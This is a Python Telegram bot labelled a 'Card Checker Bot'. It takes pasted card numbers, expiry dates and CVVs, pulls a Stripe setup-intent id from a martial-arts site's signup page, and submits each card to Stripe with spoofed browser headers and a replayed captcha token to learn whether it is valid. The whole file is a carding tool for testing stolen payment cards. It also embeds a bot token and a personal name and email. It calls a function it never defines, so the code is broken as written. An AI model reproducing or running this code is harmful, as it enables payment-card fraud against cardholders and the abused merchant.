import telebot
import requests
import re
import time

BOT_TOKEN = "7018443911:AAFP7YgMlc03URuqMUv-_VzysmewC0vt8jM"
bot = telebot.TeleBot(BOT_TOKEN)

SIGNUP_URL = "https://www.muaythaitechnician.com/signup/"
STRIPE_CONFIRM_URL = "https://api.stripe.com/v1/setup_intents/{seti_id}/confirm"

HEADERS_SIGNUP = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "cookie": "_fbp=fb.1.1746260299514.712237950499279748; mo_is_new=true; mo_has_visited=true; wordpress_test_cookie=WP%20Cookie%20check; mo_page_views_counter=8",
    "priority": "u=0, i",
    "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "cross-site",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
}

HEADERS_STRIPE = {
    "content-type": "application/x-www-form-urlencoded",
    "accept": "application/json",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
}

def parse_card(card_text):
    pattern = r"^\s*(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\s*$"
    match = re.match(pattern, card_text)
    if not match:
        return None
    cc, mm, yy, cvv = match.groups()
    mm = mm.zfill(2)
    if len(yy) == 4:
        yy = yy[2:]
    return cc, mm, yy, cvv

def get_setup_intent_key():
    try:
        resp = requests.get(SIGNUP_URL, headers=HEADERS_SIGNUP, timeout=30)
        resp.raise_for_status()
        html = resp.text
        # Extract seti_ value from HTML
        found = re.findall(r"seti_[\w\d]+", html)
        if found:
            return found[-1]  # Return last found
        else:
            return None
    except Exception as e:
        return None

def confirm_stripe(seti_id, cc, mm, yy, cvv):
    url = STRIPE_CONFIRM_URL.format(seti_id=seti_id)
    data = {
        "payment_method_data[type]": "card",
        "payment_method_data[billing_details][email]": "peshangsalam2002@gmail.com",
        "payment_method_data[billing_details][name]": "Peshang Salam",
        "payment_method_data[card][number]": cc,
        "payment_method_data[card][cvc]": cvv,
        "payment_method_data[card][exp_month]": mm,
        "payment_method_data[card][exp_year]": yy,
        "payment_method_data[guid]": "df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59",
        "payment_method_data[muid]": "3852b30c-2153-48ea-a84f-1a9d9de755b4779625",
        "payment_method_data[sid]": "ab9c9b1c-e6f7-4ef4-8cda-f54418bc7172a64f6d",
        "payment_method_data[pasted_fields]": "number",
        "payment_method_data[payment_user_agent]": "stripe.js/ca98f11090; stripe-js-v3/ca98f11090; card-element",
        "payment_method_data[referrer]": "https://www.muaythaitechnician.com",
        "payment_method_data[time_on_page]": "56557",
        "expected_payment_method_type": "card",
        "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoicUdSazJ3cFVUN3RPUFJySGVQR2dMdS9OMEJoZ0Znb2tQK0ljU1hadU5ZOS9VMG9uaG5DYzNONzFYT091QzEvWVBPZFBQTDN4Qzh3d3FHdnJGbG0vNXV4ZzZsZ004YmhwaUdTcmZTMitiNkJaYnlDSnlBMnlhU0REMUtpZG4xbFhkRTZOKzdrdmZERTFoUHQybU1LSVNKRFBJaW9UTi9BSWpnVjNtOWk5N2VqYW1UVnFmblRwOUovaklUWHlweXV0YUwxWUdLNERqK1l3dHoxUi9uQitLU09QdXhGOW5jMVJhUXMwWFg3NmlnUmw1M2wxOVZBSmI2Mk5RaXM4SlpJdldjOWgzU2xlRDdYWDBZWGdLNEltNVRJUE1laUdUWm9IRW50YzV1UHRIUHJCeXZuaFpROVNpR0NMTU8zV2o5cnFLUmZJVFFCZkNEZm4yTnBLK0lMMTdJWCtUS1hjNFNyUzVZOU1wa3RBZXdLek5ja2JnL0hzMCtKMVpMRDB0QjJDU0ZSRnF0TG9xMGlzalI1T0svbUJFc25MMldMRGoyV2RGT3lBWGtDRkw2Z2VoRldJRDJrVVpaVUhuWGdISUgxbGg3SnRqRG1WTmlhVmgrOTRjMHpzSjA1dVNCWEFRMFI0NHB5L01ZSlFYUG5CaGZrekwzdUVKS0lOMGU0ZmZFMnZXa2oxSlJZOEZyT1FaYnQvWjZ1SkRUQ25ReXRGbkRWTFd5bk5mbGNYQjcySml5Z1Z4OXhZV1lFOUIzRXdaU2RlVXU5Mnp1UytjOXA0V292L1JmblR0WUFTSXlaUi92Y0RwMmZiemQzV2xGSGMrRjZqcDlyc3haSVllRjIydURJZnNibDltVFdjdTB3bEJUZDBaQ2swa3p0WjhhTHhNS3B1RWNPbTExVWFYbk5ZODBXQlZpRWpiSXEzelkxY2tLaDRnemVidWkyS1FrdlZzZWwxc2ZYcnlKRjJFQzUzUVRIc1lJRmFnaGxZTGl1aUFPb2ZEY3RvTzFPTmdrMDBwZ2NaZ3YrdDQwcXFYQlpobFpTOVV3b2RUVlVrMDhzVzVybUdscEhkcW1ncXFYa3pJVGppNDRWR0lkUENPdHNvazVSaUYyZlR4b2ZBNE1ybWVhY0ZZaHZwTHFxWFpxQWRQVVNxYWZtTnNJaVE0eWhiZWNkY3lrWi9TdFplaG1tWC8vUm9PcmpEQzBkdjFhS3dSY0Joaktud1l4Tnh5TFlRb3M0K0U5WERaNFI3MERTeUdPUVBoanpFLy91YnIxSEJZUWdnbFBFOXJzcHI3REgzWXBIR1NQWmlIZ0I1WGVSUURSVmVROE82SSsydjE1ZHNMYWJzNllGVGEvaFNVTGpkVG9mUytiYk5GTkFBQys1TDNiNzBCS3hhT0dhUlYxZDNPNXRTNmZYT0oxNWJxZjFVN1paR3ZKMmdxVHFZQ2lrM1JoRndidFYwVWpwSlB3SlpZQkwwZWxMZXNVaXZPa04xVWptSVBwc2I0ZnBma24zd0hjVE83YmNwWGJhZmlZUkJtTDh4VkQwdkJtT08wUFZDbVpzYTcwUmxZZUpaZTFCdUp0dElzY0FkZkNQRDdaVDdLVVQvK29mTStBRnVKRHluVjYxWE41c2VWUHJUZnhwTElMMTU1UE4xMDVVNHpwYjV6WWRicWZQRTJsZE5CVDNacjFNam14NnBTaDZ4RnMrSUwzeFhtNFNEQnpuN3E5VEg3aFA5UkNTYXAvMzY4TG5kd1o2RWg5TVVCSjNXWGVUWDFpb21waWl2bmE0b1kzZlQyK1NvZGcwR003SjlEdTlnYlJ3WnJFUEhwZW9oOW5CdXh5Zmhmd2hwckppYk80UDh5RkZnVlNLMnJ4anFGQVMxMUd4NXBpdkRsRVltUGlITG5iYnRjQWt1MTgraW9OM1M2elVRN1VQeExrbm0rdWZCaUlFc1NNcVNyY2NGQ1pLTVhEZlQ2L05PZFYxZ1ZMck1EcUFCN0RxeFk0SlN3S0Y4V2dKZTloZUU5NlBPakdlMkJnZXJJYUJ0WVJ6YmtUcy9KeFlFdjNoYnlOSmpWR3UvVzBQM3NzR3ZQSmlHbjBROTlLSW43RXZlc1NKeG40ZWpNV0dGM2ZVNURMUitIYlhJS2FUZEszNTRmek1QNjVHZllXeGlpcm5WY3RJeUc0RUFFUUhvb24xTFU3RjAxYXRMUmJLZEhGRXZBUzFpcW1ReHFValF5cDlrOUpoMDNUdU1YMGladW43eW9vK0YzaDVoSzAxQmZBZFlQR1VlYzJJblMvRTZGNDR2SWRhRkwzVlIvOTZkbXNOR3VWQWFlcDFWM2ZwQUNBd2xOc0d4OWdpQXdiM0YzRkFNaDhTa1hSaCtTNEhObHpYQ0JoNFBqUzN0aGtsTHJnWUdKWGRtam9aRmhpVUpzQmFnNUNwNm1SdXVrVE8ybUNPTVdIZTR1SW5hWExvazJQRWxLTjlWUEVTd1k0eUhhMy9ST3JKd0JNWVAzNHhKdHcvMUxZcHEzd2NCaCs5WlNpODJ2bGQ1NkxpVEd0RGJLempkbVpwZm51RjVsUnpJRTVOVDNHRVdkczh1dmJjQkNoOHdtQVZsZlU4dlBVb0VXMTZzNWczN1N4T2p5bXVzLzNwaFc0R0RsN2dkRmNuaDZzdXJnMERkWEYyOTZZSWt5c2MxWUU0RktybVB6SnNCUmwyTStNVENURmhNaVRqT0ZIc0xrNzl0QjI1YXJKRUJkQmxTN0NROEtwRGFlUlYwSFM0NmlTTlQwZVNNVTVTWElmeTFTamNtWXdCTEZyQVdrR2ZqN1R4RUJSSmJBdS9FVnJBczRMYUplVk5lNVdIaGR1azROM2ZEaXY4cHhkMGZPOTB5WWZNZUdWOHlPUUpjR25SNWd2dVJZdUtlMWhraWw3aXJSL0l4NWtiQzl1cFprUlRMNTZWZStZeWs4NE94IiwiZXhwIjoxNzQ2MjYwNTMwLCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMjY5ZjgwYiIsInBkIjowLCJjZGF0YSI6InpRaTd2ekhpNTBGMlFyS1JoMmQ4bVZOdFNPM3VOYTJPaTlmNG9LUmRnOUhKeklBVkIwN2kyNmpHY2ZBRkFhTFRHSXF6TGZrYnBHaE80b2M0K09USTB5b3JYUGs1aloxRXJXc1R5TTVpV3lpV3RWc0FPNzRJcTl5bFQvTEdZRCtRRTVTUDdSb2IxMTc0N21IN01raC85VVpISHEwa25hWW45Y2ZKUWZBSm9OZUQ5RER1VUFLQ2tETURoK2dOWm9hVDhyUU92Y1V4NnUwTHRTNnAifQ.yiIwW4i9vDHt1u7pKyNnRzpgQMrjwyxZVhv7IW1dOjQ"
    }
    try:
        resp = requests.post(url, headers=HEADERS_STRIPE, data=data, timeout=30)
        result = resp.json()
        status = result.get("status", "")
        error = result.get("error", {})
        message = error.get("message", "")
        code = error.get("code", "")
        decline_code = error.get("decline_code", "")
        country = result.get("payment_method", {}).get("card", {}).get("country", "N/A")
        return (
            f"Status: {status}\n"
            f"Country: {country}\n"
            f"Code: {code}\n"
            f"Decline Code: {decline_code}\n"
            f"Message: {message}"
        )
    except Exception as e:
        return f"❌ Error: {str(e)}"

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 MuayThaiTechnician Card Checker Bot\n"
        "Send cards in format:\n"
        "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n"
        "One per line.\n"
        "Example:\n"
        "5170414899790881|03|27|704\n"
        "4242424242424242|12|25|123"
    )

@bot.message_handler(func=lambda message: True)
def card_handler(message):
    cards = message.text.strip().split('\n')
    for card in cards:
        parsed = parse_card(card)
        if not parsed:
            bot.send_message(message.chat.id, f"❌ Invalid card format: {card}")
            continue
        cc, mm, yy, cvv = parsed

        seti_id = get_seti_id()
        if not seti_id:
            bot.send_message(message.chat.id, "❌ Failed to extract seti_... value from signup page.")
            continue

        result = confirm_stripe(seti_id, cc, mm, yy, cvv)
        bot.send_message(message.chat.id, result)
        time.sleep(10)

bot.infinity_polling()
